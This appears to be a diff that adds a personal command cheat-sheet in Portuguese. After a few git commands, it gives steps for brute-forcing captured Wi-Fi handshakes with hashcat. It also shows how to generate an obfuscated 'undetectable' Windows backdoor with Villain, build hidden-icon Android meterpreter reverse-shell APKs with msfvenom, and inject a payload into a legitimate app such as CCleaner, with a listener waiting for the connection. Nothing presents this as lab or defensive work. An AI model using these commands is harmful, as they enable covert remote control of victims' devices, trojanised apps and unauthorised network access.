@@ -1,0 +1,51 @@
+#Salvando arquivos no github
+git status
+git add (documento)
+git commit -m "nome do commit"
+git push -u origin "nome do branch"
+
+
+#Usando wifite para hanshake e hashcat para brute force
+sudo cap2hccapx <nombre del archivo>.cap <nombre del archivo>.hccapx (arquivo cap e onde tem as hanshake do wifite)
+(Caso a tentativa acima n funcione, tentar essa)
+https://hashcat.net/cap2hashcat/ (FUNCIONA)
+
+sudo hashcat -m 2500 -a3 ?d?d?d?d (aquivo).hccapx
+
+
+
+#Backdoor indetectavel windows por codigo executavel no terminal windows
+sudo apt install villain
+
+help generate (informacoes)
+generate os=windows lhost=() obfuscate encode constraint_mode 
+(Genera um codigo que deve ser executado no terminal windows)
+
+
+#Hide app do android
+msfvenom -p android/meterpreter/reverse_tcp LHOST() LPORT () AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true -o (nome).apk
+
+msfconsole
+use multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+show options
+set LHOST ()
+set LPORT ()
+exploit
+
+
+#Criando PAYLOAD em arquivo original 
+sudo git clone https://github.com/dana-at-cp/backdoor-apk.git
+
+./backdoor-apk.sh (ccleaner_v1.17.apk) 
+meterpreter/reverse_tcp
+LHOST ()
+LPORT ()
+Merge with payload and shuffle (vai toda carga viral e mantem o app)
+
+msfconsole
+use multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+show options
+set LHOST ()
+set LPORT ()
